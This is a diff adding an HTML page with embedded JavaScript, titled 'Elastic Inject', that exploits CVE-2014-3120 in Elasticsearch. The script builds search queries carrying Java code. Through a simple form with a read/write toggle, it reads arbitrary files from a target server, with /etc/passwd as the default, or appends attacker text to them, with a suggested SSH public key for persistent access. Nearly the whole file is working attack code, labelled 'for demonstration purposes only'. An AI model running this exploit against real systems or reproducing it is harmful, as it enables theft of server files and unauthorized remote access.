@@ -1,0 +1,152 @@
+<!--
+##CVE-2014-3120 Elastic Search Remote Code Execution
+
+This project demonstrates the CVE-2014-3120 vulnerability/misconfiguration.  It allows you to read from and append to files on the system hosting ES, provided the user running ES has access to them.
+
+###Notes
+
+This does not require a web server.  Save it locally and run it from a browser.
+
+Discovery and vuln publishing credit goes to: @BvdBijl - http://bouk.co/blog/elasticsearch-rce/
+-->
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!-- Latest compiled and minified CSS -->
+<link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css" rel="stylesheet">
+
+<!-- Optional theme -->
+<link href="http://netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap-theme.min.css" rel="stylesheet">
+<style>
+body {
+  padding-top: 50px;
+}
+.starter-template {
+  padding: 40px 15px;
+  text-align: center;
+}
+
+</style>
+</head>
+
+
+<script src="http://code.jquery.com/jquery-1.11.1.min.js"></script>
+<script>
+function es_inject() {
+
+var read_file;
+var write_file;
+
+read_file = function(filename) {
+  return ("import java.util.*;\nimport java.io.*;\nnew Scanner(new File(\"" + filename + "\")).useDelimiter(\"\\\\Z\").next();");
+};
+
+write_file = function(filename) {
+  return ("import java.util.*;\nimport java.io.*;\nPrintWriter writer = new PrintWriter(new BufferedWriter(new FileWriter(\"" + filename + "\", true)));\nwriter.println(\"" + document.getElementById("element_2").value + "\");\nwriter.close();");
+};
+
+$(function() {
+  var payload, filename, files, host, _i, _len;
+  files = [document.getElementById("element_3").value];
+  payload = {
+    "size": 1,
+    "query": {
+      "filtered": {
+        "query": {
+          "match_all": {}
+        }
+      }
+    },
+    "script_fields": {}
+  };
+        if (document.getElementById("element_4").checked) {
+        for (_i = 0, _len = files.length; _i < _len; _i++) {
+          filename = files[_i];
+          payload["script_fields"][filename] = {
+                  "script": write_file(filename)
+        };
+        }
+       } else {
+          for (_i = 0, _len = files.length; _i < _len; _i++) {
+          filename = files[_i];
+          payload["script_fields"][filename] = {
+                  "script": read_file(filename)
+        };
+        }
+       }    
+
+
+  $.getJSON("http://" + document.getElementById("element_1").value + ":9200/_search?source=" + (encodeURIComponent(JSON.stringify(payload))) + "&callback=?", function(data) {
+    var content, contents, hit, _j, _len1, _ref, _results;
+    console.log(data);
+    _ref = data["hits"]["hits"];
+    _results = [];
+    for (_j = 0, _len1 = _ref.length; _j < _len1; _j++) {
+      hit = _ref[_j];
+      _results.push((function() {
+        var _k, _len2, _ref1;
+        _ref1 = hit["fields"];
+        for (filename in _ref1) {
+          contents = _ref1[filename];
+          document.getElementById("script_results").innerHTML += ("<h2>" + filename + "</h2>");
+          for (_k = 0, _len2 = contents.length; _k < _len2; _k++) {
+            content = contents[_k];
+            document.getElementById("script_results").innerHTML += (content);
+          }
+          document.getElementById("script_results").innerHTML += ("<hr>");
+    //document.getElementById("script_results").innerHTML += (document.getElementById("element_4").checked);
+        }
+      })());
+    }
+    return _results;
+  });
+});
+};
+//es_inject();
+</script>
+<body>
+
+    <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="#">Elastic Inject</a>
+        </div>
+
+      </div>
+    </div>
+
+    <div class="container">
+
+      <div class="starter-template">
+                <h2>CVE-2014-3120 Elastic Search Remote Code Execution</h2>
+                <p class="lead">This will read and write files from an ES instance vulnerable to CVE-2014-3120.<br> This is for demonstration purposes only.</p>
+      </div>
+      <div class="col-md-8">
+                <!-- <form id="ES_Inject" action="" method=""> /-->
+                <label for="element_1">ES_IP_Address: </label><br/>
+                <input id="element_1" name="element_1" class="element text medium" type="text" maxlength="255" value="127.0.0.1"/> <br/>
+                <label for="element_3">File to read/append to: </label><br/>
+                <input id="element_3" name="element_3" class="element text medium" type="text" maxlength="255" value="/etc/passwd"/> <br/>
+                <label class="description" for="element_2">Content to append: </label><br/>
+                <textarea id="element_2" name="element_2" class="element textarea large">YOUR_SSH_PUBLIC_KEY or SOMETHING&lt;/textarea&gt; <br/>
+    <!-- <input id="element_4" type="radio" name="es_action" value="read" checked>READ<br/> /-->
+    <input id="element_4" type="checkbox" name="es_action" value="write">WRITE<br/>
+                <!-- <input id="saveForm" class="button_text" type="submit" name="submit" value="Submit" onClick="es_inject();"/> /-->
+                <button onclick="es_inject();">Click me</button>
+                <!-- </form> /-->
+<h3>Your file contents should appear below if a read is successful. </h3>
+<div id="script_results">
+
+</div>
+     </div>
+<div class="col-md-8">
+  Original vulnerability discovered by <a href="https://twitter.com/bvdbijl"> @BvdBijl</a>  - <a href="http://bouk.co/blog/elasticsearch-rce/">http://bouk.co/blog/elasticsearch-rce/</a>
+</div>
+    </div><!-- /.container -->
+    <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+</body></html>
